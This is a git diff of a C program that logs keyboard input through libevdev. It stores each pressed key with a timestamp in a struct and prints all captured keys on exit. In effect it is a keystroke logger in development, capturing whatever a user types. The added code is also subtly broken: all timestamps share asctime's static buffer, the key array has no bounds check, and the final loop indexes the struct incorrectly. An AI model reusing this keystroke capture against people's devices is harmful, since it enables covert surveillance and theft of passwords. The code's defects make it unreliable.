@@ -141,22 +141,32 @@ void log_keys(key_package* key_package) {
       // we only care about EV_KEY, represented by ev.type == 1
       if (ev.type == 1) {
         if (ev.value == 1 || ev.value == 2) {
-          printf("Key pressed!\n%d (%s) %d (%s) value %d\n",
-                ev.type,
-                libevdev_event_type_get_name(ev.type),
-                ev.code,
-                libevdev_event_code_get_name(ev.type, ev.code), 
-                ev.value);
+          // printf("Key pressed!\n%d (%s) %d (%s) value %d\n",
+          //       ev.type,
+          //       libevdev_event_type_get_name(ev.type),
+          //       ev.code,
+          //       libevdev_event_code_get_name(ev.type, ev.code), 
+          //       ev.value);
           
-          // TODO: get current time here
+          // get current time
+          time_t rawtime;
+          struct tm * timeinfo;
+          time ( &rawtime );
+          timeinfo = localtime ( &rawtime );
 
-          // TODO: make key struct, add to key package. do the file writing in another file
-          // key_info pressed_key = {
-          //   .key = libevdev_event_code_get_name(ev.type, ev.code),
-          //   .timestamp = "uh"
-          // };
+          // make key struct, add to key package. do the file writing in another file
+          key_info pressed_key = {
+            .key = libevdev_event_code_get_name(ev.type, ev.code),
+            .timestamp = asctime(timeinfo)
+          };
 
-          // TODO: append to key_package->keys
+          printf("Created new key_info object. Key: %s  Timestamp: %s", pressed_key.key, pressed_key.timestamp);
+
+          // append to key_package->keys
+          key_package->keys[key_package->keys_arr_size] = pressed_key;
+          key_package->keys_arr_size++;
+
+          printf("New key_package array size: %ld", key_package->keys_arr_size);
         }
         // else {
         //   printf("Key unpressed!\n%d (%s) %d (%s) value %d\n",
@@ -181,6 +191,13 @@ void log_keys(key_package* key_package) {
     // file every few seconds.
     if (ev.code == 46) {
       printf("exiting\n");
+
+      printf("All keys in key_package struct: \n");
+
+      for (size_t i = 0; i < key_package->keys_arr_size; i++) {
+        printf("%s  ", key_package->keys->key[i]);
+      }
+
       exit(1);
     }
   }
@@ -195,13 +212,6 @@ int main(void) {
   key_package key_package;
   log_device(&key_package);
   log_keys(&key_package);
-
-  // time_t rawtime;
-  // struct tm * timeinfo;
-
-  // time ( &rawtime );
-  // timeinfo = localtime ( &rawtime );
-  // printf ( "Current local time and date: %s", asctime (timeinfo) );
 
   return 0;
 }
